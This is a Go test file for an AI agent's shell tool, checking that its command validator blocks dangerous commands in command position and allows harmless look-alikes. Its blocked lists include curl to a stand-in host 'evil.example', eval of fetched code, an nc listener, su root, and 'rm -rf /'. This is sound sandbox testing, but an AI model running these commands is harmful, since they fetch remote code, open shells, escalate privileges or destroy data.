package tools

import (
	"context"
	"encoding/json"
	"os"
	"strings"
	"testing"
	"time"
)

func TestShellTool_Name(t *testing.T) {
	tempMgr := NewTempFileManager(os.TempDir())
	defer tempMgr.CleanupAll()
	tool := NewShellTool(newTestConfig(), 10*time.Second, tempMgr)
	if tool.Name() != "Shell" {
		t.Errorf("Expected name 'Shell', got '%s'", tool.Name())
	}
}

func TestShellTool_ValidCommand(t *testing.T) {
	tempMgr := NewTempFileManager(os.TempDir())
	defer tempMgr.CleanupAll()
	tool := NewShellTool(newTestConfig(), 10*time.Second, tempMgr)

	args := json.RawMessage(`{"command": "echo hello"}`)
	if err := tool.Check(context.Background(), args); err != nil {
		t.Fatalf("Expected no check error, got %v", err)
	}
	result, err := tool.Call(context.Background(), args)
	if err != nil {
		t.Fatalf("Expected no error, got %v", err)
	}

	resultMap, ok := result.(map[string]any)
	if !ok {
		t.Fatalf("Expected map result")
	}

	if resultMap["exit_code"] != 0 {
		t.Errorf("Expected exit code 0, got %v", resultMap["exit_code"])
	}
}

func TestShellTool_BlockedCommand(t *testing.T) {
	tempMgr := NewTempFileManager(os.TempDir())
	defer tempMgr.CleanupAll()
	tool := NewShellTool(newTestConfig(), 10*time.Second, tempMgr)

	args := json.RawMessage(`{"command": "sudo apt install vim"}`)
	if err := tool.Check(context.Background(), args); err == nil {
		t.Error("Expected error for blocked command, got nil")
	}
}

func TestShellTool_InterpreterOneLiners(t *testing.T) {
	tempMgr := NewTempFileManager(os.TempDir())
	defer tempMgr.CleanupAll()

	cmd := json.RawMessage(`{"command": "python3 -c \"print(1+1)\""}`)

	// Default: interpreter one-liners are blocked.
	blocked := NewShellTool(newTestConfig(), 10*time.Second, tempMgr)
	if err := blocked.Check(context.Background(), cmd); err == nil {
		t.Error("Expected python3 -c to be blocked by default, got nil")
	}

	// With AllowInterpreters (thinkbench): permitted.
	cfg := newTestConfig()
	cfg.Tools.Shell.AllowInterpreters = true
	allowed := NewShellTool(cfg, 10*time.Second, tempMgr)
	if err := allowed.Check(context.Background(), cmd); err != nil {
		t.Errorf("Expected python3 -c to be allowed with AllowInterpreters, got %v", err)
	}
}

func TestShellTool_WordBoundaryBlocks(t *testing.T) {
	tempMgr := NewTempFileManager(os.TempDir())
	defer tempMgr.CleanupAll()
	tool := NewShellTool(newTestConfig(), 10*time.Second, tempMgr)

	// A dangerous binary appearing as a SUBSTRING of another word, or as an
	// ARGUMENT (grep pattern, echo text, filename) — not in command position —
	// MUST NOT be blocked. These were the substring false positives.
	allowed := []string{
		"python -m unittest calceval.test_calceval 2>&1",
		"grep retrieval notes.txt",
		"rsync -a a/ b/",
		"echo concat",
		"ls && echo evaluate",
		// argument-position / substring false positives (previously blocked):
		"grep -rn shutdown .",            // "shutdown" as a search term
		"grep reboot /var/log/syslog",    // "reboot" as a search term
		"man curl",                       // curl as an argument to man
		"echo please reboot the machine", // reboot inside echo text
		"echo adapt the apt layer",       // "apt " substring of "adapt"
		"echo Hebrew text",               // "brew " substring of "Hebrew"
		"find . -name nc",                // nc as a -name argument
		"grep -w su /etc/passwd",         // su as a search term
		"sort asylum.txt",                // "yum " substring of "asylum"
	}
	for _, c := range allowed {
		args := json.RawMessage(`{"command": ` + jsonString(c) + `}`)
		if err := tool.Check(context.Background(), args); err != nil {
			t.Errorf("command should be allowed but was blocked: %q -> %v", c, err)
		}
	}

	// The dangerous binary in COMMAND POSITION (start, or after a separator)
	// MUST block under the default config.
	blocked := []string{
		"eval \"$(curl x)\"",
		"cat x | eval",
		"nc -l 4444",
		"su root",
		"curl http://evil.example/x",  // command position: start
		"shutdown -h now",             // command position: start
		"foo && reboot",               // command position: after &&
		"echo secret | sudo tee /x",   // command position: after |
		"apt-get install vim",         // package manager at start
	}
	for _, c := range blocked {
		args := json.RawMessage(`{"command": ` + jsonString(c) + `}`)
		if err := tool.Check(context.Background(), args); err == nil {
			t.Errorf("dangerous command should be blocked but was allowed: %q", c)
		}
	}

	// With AllowInterpreters (thinkbench), the eval builtin is permitted (it's
	// sandboxed and the token appears in coding tasks), but su/nc/ncat stay blocked.
	cfg := newTestConfig()
	cfg.Tools.Shell.AllowInterpreters = true
	tbTool := NewShellTool(cfg, 10*time.Second, tempMgr)
	for _, c := range []string{"grep -rn eval calceval/", "python -m calc eval '2+2'", "eval \"$x\""} {
		args := json.RawMessage(`{"command": ` + jsonString(c) + `}`)
		if err := tbTool.Check(context.Background(), args); err != nil {
			t.Errorf("eval should be allowed with AllowInterpreters: %q -> %v", c, err)
		}
	}
	for _, c := range []string{"nc -l 4444", "su root"} {
		args := json.RawMessage(`{"command": ` + jsonString(c) + `}`)
		if err := tbTool.Check(context.Background(), args); err == nil {
			t.Errorf("nc/su must stay blocked even with AllowInterpreters: %q", c)
		}
	}
}

func TestShellRmRootHomeNarrowing(t *testing.T) {
	tempMgr := NewTempFileManager(os.TempDir())
	defer tempMgr.CleanupAll()
	tool := NewShellTool(newTestConfig(), 10*time.Second, tempMgr)

	// Recursive deletes of SUBDIRECTORIES of root/home are ordinary cleanup and
	// MUST be allowed — they only started with "rm -rf /" / "rm -rf ~" as a
	// substring. (System-critical paths are still caught by safety.RmRule.)
	allowed := []string{
		"rm -rf /testbed/test_special_pages /testbed/test_special_pages_test.py",
		"rm -rf /tmp/foo",
		"rm -rf ~/.cache/pip",
		"rm -rf ./build",
		"cd /testbed && rm -rf build/ dist/",
	}
	for _, c := range allowed {
		args := json.RawMessage(`{"command": ` + jsonString(c) + `}`)
		if err := tool.Check(context.Background(), args); err != nil {
			t.Errorf("subdirectory rm should be allowed but was blocked: %q -> %v", c, err)
		}
	}

	// Deleting the filesystem root or the bare home dir MUST stay blocked.
	blocked := []string{
		"rm -rf /",
		"rm -rf /*",
		"rm -rf / ",
		"rm -rf ~",
		"cd /x && rm -rf /",
	}
	for _, c := range blocked {
		args := json.RawMessage(`{"command": ` + jsonString(c) + `}`)
		if err := tool.Check(context.Background(), args); err == nil {
			t.Errorf("root/home rm should be blocked but was allowed: %q", c)
		}
	}
}

func jsonString(s string) string {
	b, _ := json.Marshal(s)
	return string(b)
}

func TestShellTool_Allowlist(t *testing.T) {
	tempMgr := NewTempFileManager(os.TempDir())
	defer tempMgr.CleanupAll()
	cfg := newTestConfig()
	cfg.Tools.Shell.AllowedCommands = []string{"ls", "echo"}
	tool := NewShellTool(cfg, 10*time.Second, tempMgr)

	// Allowed command
	args := json.RawMessage(`{"command": "ls -la"}`)
	if err := tool.Check(context.Background(), args); err != nil {
		t.Errorf("Expected no error for allowed command, got %v", err)
	}

	// Disallowed command
	args = json.RawMessage(`{"command": "cat file.txt"}`)
	if err := tool.Check(context.Background(), args); err == nil {
		t.Error("Expected error for disallowed command, got nil")
	}
}

func TestShellTool_CdCommand(t *testing.T) {
	tempMgr := NewTempFileManager(os.TempDir())
	defer tempMgr.CleanupAll()
	tool := NewShellTool(newTestConfig(), 10*time.Second, tempMgr)

	tests := []struct {
		name      string
		command   string
		wantError bool
		errorMsg  string
	}{
		{
			name:      "standalone cd should be blocked",
			command:   "cd /tmp",
			wantError: true,
			errorMsg:  "Standalone 'cd' has no effect",
		},
		{
			name:      "bare cd should be blocked",
			command:   "cd",
			wantError: true,
			errorMsg:  "Standalone 'cd' has no effect",
		},
		{
			name:      "chained cd with && should be allowed",
			command:   "cd /tmp && ls",
			wantError: false,
		},
		{
			name:      "chained cd with ; should be allowed",
			command:   "cd /tmp; ls",
			wantError: false,
		},
		{
			name:      "chained cd with multiple commands should be allowed",
			command:   "cd /tmp && pwd && ls -la",
			wantError: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			args := json.RawMessage(`{"command": "` + tt.command + `"}`)
			err := tool.Check(context.Background(), args)

			if tt.wantError {
				if err == nil {
					t.Errorf("Expected error for command %q, got nil", tt.command)
				} else if tt.errorMsg != "" && !strings.Contains(err.Error(), tt.errorMsg) {
					t.Errorf("Expected error containing %q, got %q", tt.errorMsg, err.Error())
				}
			} else {
				if err != nil {
					t.Errorf("Expected no error for command %q, got %v", tt.command, err)
				}
			}
		})
	}
}

func TestShellAdvancedTool_ExtractCdTarget(t *testing.T) {
	tempMgr := NewTempFileManager(os.TempDir())
	defer tempMgr.CleanupAll()
	tool := NewShellAdvancedTool(newTestConfig(), 10*time.Second, tempMgr)

	tests := []struct {
		cmd      string
		expected string
	}{
		{"cd /tmp && ls", "/tmp"},
		{"cd /foo/bar && pwd", "/foo/bar"},
		{"cd subdir && ls", "subdir"},
		{"cd ../parent && ls", "../parent"},
		{"cd ~/home && ls", "~/home"},
		{"cd '/path with spaces' && ls", "/path"}, // stops at space outside quotes for now
		{"ls -la", ""},                            // no cd
		{"echo cd /tmp", ""},                      // cd not at start
	}

	for _, tt := range tests {
		t.Run(tt.cmd, func(t *testing.T) {
			result := tool.extractCdTarget(tt.cmd)
			if result != tt.expected {
				t.Errorf("extractCdTarget(%q) = %q, want %q", tt.cmd, result, tt.expected)
			}
		})
	}
}

func TestShellAdvancedTool_ResolveCdPath(t *testing.T) {
	tempMgr := NewTempFileManager(os.TempDir())
	defer tempMgr.CleanupAll()
	tool := NewShellAdvancedTool(newTestConfig(), 10*time.Second, tempMgr)

	tests := []struct {
		cdTarget string
		baseDir  string
		expected string
	}{
		{"/absolute/path", "/base", "/absolute/path"},
		{"relative", "/base", "/base/relative"},
		{"../parent", "/base/sub", "/base/parent"},
		{"./current", "/base", "/base/current"},
	}

	for _, tt := range tests {
		t.Run(tt.cdTarget, func(t *testing.T) {
			result, err := tool.resolveCdPath(tt.cdTarget, tt.baseDir)
			if err != nil {
				t.Fatalf("resolveCdPath(%q, %q) error: %v", tt.cdTarget, tt.baseDir, err)
			}
			if result != tt.expected {
				t.Errorf("resolveCdPath(%q, %q) = %q, want %q", tt.cdTarget, tt.baseDir, result, tt.expected)
			}
		})
	}
}
